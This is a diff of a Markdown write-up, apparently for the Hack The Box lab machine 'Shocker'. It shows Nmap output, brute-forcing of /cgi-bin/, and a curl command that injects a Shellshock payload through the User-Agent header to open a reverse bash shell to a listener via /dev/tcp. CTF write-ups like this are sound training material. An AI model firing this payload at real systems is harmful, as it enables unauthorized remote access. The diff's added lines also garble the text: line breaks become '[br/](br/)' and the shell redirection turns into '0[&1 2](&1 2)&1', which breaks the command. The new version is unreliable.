@@ -11,7 +11,7 @@ categories: HackTheBox OSCP-Like
 
 We are going to pwn Shocker from Hack The Box.
 
-Link : <https://www.hackthebox.eu/home/machines/profile/108>
+Link : [https://www.hackthebox.eu/home/machines/profile/108](https://www.hackthebox.eu/home/machines/profile/108)
 
 
 Like always begin with our Nmap Scan.
@@ -37,7 +37,7 @@ No exact OS matches for host (test conditions non-ideal).
 Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-Check whats in the webpage<br/>
+Check whats in the webpage[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-shocker/2.png)
 
 Like always lets try bruteforcing the webpage to find any interesting page.
@@ -76,7 +76,7 @@ May be if we found any scripts available on ``/cgi-bin/`` we can do ``shellshock
 
 Lets bruteforce `` /cgi-bin/ `` , I gave extensions as ``sh,py,pl`` to check for any scripts.
 
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-shocker/3.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-shocker/3.png)[br/](br/)
 My guess is correct there is an ``user.sh`` script available
 
 For more info
@@ -164,7 +164,7 @@ Reference:
 So All we need to do is run this command on our machine and listening on another terminal
 
 ```bash
-curl -A '() { :; }; /bin/bash -i > /dev/tcp/10.10.14.17/9000 0<&1 2>&1' http://10.10.10.56/cgi-bin/user.sh
+curl -A '() { :; }; /bin/bash -i > /dev/tcp/10.10.14.17/9000 0[&1 2](&1 2)&1' http://10.10.10.56/cgi-bin/user.sh
 ```
 
 It is injecting on the `` User-Agent `` on the request header.
